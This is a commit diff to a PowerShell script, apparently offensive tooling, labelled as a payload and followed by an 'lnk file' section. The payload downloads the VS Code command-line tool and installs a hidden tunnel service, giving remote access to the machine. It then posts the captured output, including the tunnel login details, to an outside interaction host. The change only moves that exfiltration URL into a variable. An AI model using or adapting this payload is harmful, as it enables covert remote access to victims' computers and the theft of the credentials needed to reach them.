8fd83aac799ae081aac0e161a3cbfeb4fc6b230f
kplei <98415753+kplei@users.noreply.github.com>
2023-09-12 10:44:45 -0400

    Update vscode-shell.ps1

--- vscode-shell.ps1
+++ vscode-shell.ps1
@@ -1,6 +1,7 @@
 #Payload
 $EXEPath = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
-$pay = 'cd C:\tmp; iwr -uri https://az764295.vo.msecnd.net/stable/8b617bd08fd9e3fc94d14adb8d358b56e3f72314/vscode_cli_win32_x64_cli.zip -OutFile vscode.zip; Expand-Archive vscode.zip; cd vscode; .\code.exe tunnel user logout; Start-Sleep 3; Start-Process -FilePath .\code.exe  -ArgumentList "tunnel", "service", "install" -WindowStyle Hidden -RedirectStandardOutput  .\output.txt; Start-Sleep 3; iwr -uri ckxkmmj2vtc0000m4kwggj634koyyyyyb.oast.fun -Method Post -Body (Get-Content .\output.txt)'
+$post_url = "ckxkmmj2vtc0000m4kwggj634koyyyyyb.oast.fun"
+$pay = 'cd C:\tmp; iwr -uri https://az764295.vo.msecnd.net/stable/8b617bd08fd9e3fc94d14adb8d358b56e3f72314/vscode_cli_win32_x64_cli.zip -OutFile vscode.zip; Expand-Archive vscode.zip; cd vscode; .\code.exe tunnel user logout; Start-Sleep 3; Start-Process -FilePath .\code.exe  -ArgumentList "tunnel", "service", "install" -WindowStyle Hidden -RedirectStandardOutput  .\output.txt; Start-Sleep 3; iwr -uri ' + $post_url + ' -Method Post -Body (Get-Content .\output.txt)'
 $arguments = " -nop -c $pay"
 
 #lnk file
